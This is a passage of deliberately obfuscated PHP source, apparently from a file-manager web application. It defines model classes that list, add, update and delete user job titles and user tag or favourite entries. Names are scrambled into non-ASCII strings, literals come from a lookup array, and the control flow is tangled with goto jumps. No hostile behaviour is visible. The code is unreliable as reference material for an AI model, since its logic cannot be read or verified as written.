parent::listData($cîßÅ½ŠÏ¸, $bÇó§Ã«ÕĞ, $e¤¦§Ù…¦); } public function remove($aÉØ¿Ó‹……) { return parent::remove($aÉØ¿Ó‹……); } public function add($F’Õ§ Œ¢Û) { $c«‚Ç¡í›ê =& $_SERVER[¹…ÕÄ]; if ($this->findByName($F’Õ§ Œ¢Û[$c«‚Ç¡í›ê[28]])) { return !1; } $F’Õ§ Œ¢Û[$c«‚Ç¡í›ê[1690]] = $this->getSort(); return parent::insert($F’Õ§ Œ¢Û); } private function getSort() { $AïšÈ…‡»ô =& $_SERVER[¹…ÕÄ]; $b©¢¢›‡ô¶ = parent::listData(); $f¼“…§¦˜ä = array_to_keyvalue($b©¢¢›‡ô¶, $AïšÈ…‡»ô[33], $AïšÈ…‡»ô[1690]); return empty($f¼“…§¦˜ä) ? 0 : max($f¼“…§¦˜ä) + 1; } public function update($cŠ »‡§µè, $E„¤ãİ×ó) { $bÁ›¦ò¿„ =& $_SERVER[¹…ÕÄ]; $Eö¿éå¬„ = parent::listData($cŠ »‡§µè); $A×à›ó„ÇÜ = $this->findByName($E„¤ãİ×ó[$bÁ›¦ò¿„[28]]); if (!$Eö¿éå¬„ || $A×à›ó„ÇÜ && $A×à›ó„ÇÜ[$bÁ›¦ò¿„[388]] != $Eö¿éå¬„[$bÁ›¦ò¿„[388]]) { return !1; } return parent::update($cŠ »‡§µè, $E„¤ãİ×ó); } public function setUserJob($c¡»›œÓ±ç, $cæŒ§‰¸ŒÅ) { goto Bº“óÚç‘Ì; d²³ß„Š‘: $a´„˜‡ = rtrim($a´„˜‡, $eŒÃÍ‹¸…„[47]); Model($eŒÃÍ‹¸…„[501])->metaSet($c¡»›œÓ±ç, self::JOB_KEY, $a´„˜‡); goto EÂ«²º§; Bº“óÚç‘Ì: $eŒÃÍ‹¸…„ =& $_SERVER[¹…ÕÄ]; if (!is_array($cæŒ§‰¸ŒÅ)) { $cæŒ§‰¸ŒÅ = array($cæŒ§‰¸ŒÅ); } $cÑç£“Û‰¢ = parent::listData(); goto E‰…ÕÂìğ³; E‰…ÕÂìğ³: $eÕŞ ¨” À = array_to_keyvalue($cÑç£“Û‰¢, $eŒÃÍ‹¸…„[28]); $a´„˜‡ = $eŒÃÍ‹¸…„[373]; foreach ($cæŒ§‰¸ŒÅ as $cº²Ô‡ ÎÔ) { if ($eÕŞ ¨” À[$cº²Ô‡ ÎÔ]) { $a´„˜‡ .= $eÕŞ ¨” À[$cº²Ô‡ ÎÔ][$eŒÃÍ‹¸…„[388]] . $eŒÃÍ‹¸…„[47]; } else { $Aõ‡ŸŠË†è = $this->add($cº²Ô‡ ÎÔ); $a´„˜‡ .= $Aõ‡ŸŠË†è . $eŒÃÍ‹¸…„[47]; } } goto d²³ß„Š‘; EÂ«²º§: } public function getUserJob($aİÆß¼…í ) { $EºØ±Š‘ö = Model($_SERVER[¹…ÕÄ][501])->metaGet($aİÆß¼…í ); return $this->getUserJobInfo($EºØ±Š‘ö[self::JOB_KEY]); } public function getUserJobInfo($cÑÚ¡¯‚ÚÆ) { goto bÁ³­®Ş·¥; AÙË‚¡‰Â¥: return $f©ƒŠº­Íñ; goto cÄ®‚‡˜Í; bÁ³­®Ş·¥: $d¢‹µ¬†Ï‰ =& $_SERVER[¹…ÕÄ]; $C½ä¶§‚‘¨ = explode($d¢‹µ¬†Ï‰[47], $cÑÚ¡¯‚ÚÆ); $eî˜Ç‹ÃÎš = parent::listData(); goto føÅ¿²æ…™; føÅ¿²æ…™: $eî˜Ç‹ÃÎš = array_remove_key($eî˜Ç‹ÃÎš, $d¢‹µ¬†Ï‰[192]); $f©ƒŠº­Íñ = array(); foreach ($C½ä¶§‚‘¨ as $ašŞ£¾›ÕÎ) { if (isset($eî˜Ç‹ÃÎš[$ašŞ£¾›ÕÎ])) { $f©ƒŠº­Íñ[] = $eî˜Ç‹ÃÎš[$ašŞ£¾›ÕÎ]; } } goto AÙË‚¡‰Â¥; cÄ®‚‡˜Í: } } goto d§ÒŸ‡í«Å; d–ó³˜ø½ô: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($cÒ™æĞ ˜É) { $BÍ“›½‚Š² =& $_SERVER[¹…ÕÄ]; return array($BÍ“›½‚Š²[1770] => array(USER_ID, $BÍ“›½‚Š²[1771])); } protected function listData() { $d¸ç¯™† =& $_SERVER[¹…ÕÄ]; $Aºœ¨¬äò = array($d¸ç¯™†[1496] => USER_ID, $d¸ç¯™†[457] => array($d¸ç¯™†[1774], 0)); $aÇŠÑîİ± = $d¸ç¯™†[1776]; $d‘ ‹ºà¼ˆ = $this->field($aÇŠÑîİ±)->where($Aºœ¨¬äò)->order($d¸ç¯™†[1777])->select(); return $d‘ ‹ºà¼ˆ ? $d‘ ‹ºà¼ˆ : array(); } protected function listByTag($b·‰ÒëğÒù) { } protected function addToTag($E‡ÍÀá„¶, $A‘ãÈ‰®’±) { $bÂ¼ˆ‘áÛ =& $_SERVER[¹…ÕÄ]; if (!Model($bÂ¼ˆ‘áÛ[1911])->listData($A‘ãÈ‰®’±) || !Model($bÂ¼ˆ‘áÛ[770])->pathInfo($E‡ÍÀá„¶)) { return !1; } $EåäáÆ„½ = array($bÂ¼ˆ‘áÛ[1496] => USER_ID, $bÂ¼ˆ‘áÛ[457] => $A‘ãÈ‰®’±, $bÂ¼ˆ‘áÛ[408] => $E‡ÍÀá„¶, $bÂ¼ˆ‘áÛ[409] => $bÂ¼ˆ‘áÛ[403], $bÂ¼ˆ‘áÛ[407] => $bÂ¼ˆ‘áÛ[33], $bÂ¼ˆ‘áÛ[1671] => 0); if ($this->where($EåäáÆ„½)->find()) { return !1; } return $this->add($EåäáÆ„½); } protected function removeFromTag($AùŞÎê²Â•, $D÷»»Ø‘ô°) { $Fö½·Î‘ªò =& $_SERVER[¹…ÕÄ]; if (!Model($Fö½·Î‘ªò[1911])->listData($D÷»»Ø‘ô°)) { return !1; } if (is_array($AùŞÎê²Â•)) { $AùŞÎê²Â• = array($Fö½·Î‘ªò[7], $AùŞÎê²Â•); } $aßÙé‹Öâ† = array($Fö½·Î‘ªò[1496] => USER_ID, $Fö½·Î‘ªò[457] => $D÷»»Ø‘ô°, $Fö½·Î‘ªò[409] => $Fö½·Î‘ªò[403], $Fö½·Î‘ªò[408] => $AùŞÎê²Â•); return $this->where($aßÙé‹Öâ†)->delete(); } protected function removeByTag($aù´‹•áÊ¥) { $dç¼»Ò†Š… =& $_SERVER[¹…ÕÄ]; if (!$aù´‹•áÊ¥) { return !1; } $E“ñ«¤âîŞ = array($dç¼»Ò†Š…[1496] => USER_ID, $dç¼»Ò†Š…[457] => $aù´‹•áÊ¥); return $this->where($E“ñ«¤âîŞ)->delete(); } protected function removeBySource($D¡åººí) { $f‚ÊÑ¦´œƒ =& $_SERVER[¹…ÕÄ]; if (is_array($D¡åººí)) { $D¡åººí = array($f‚ÊÑ¦´œƒ[7], $D¡åººí); } $fš‚™Œ“ Ä = array($f‚ÊÑ¦´œƒ[1496] => USER_ID, $f‚ÊÑ¦´œƒ[408] => $D¡åººí, $f‚ÊÑ¦´œƒ[457] => array($f‚ÊÑ¦´œƒ[950], 0)); return $this->where($fš‚™Œ“ Ä)->delete(); } }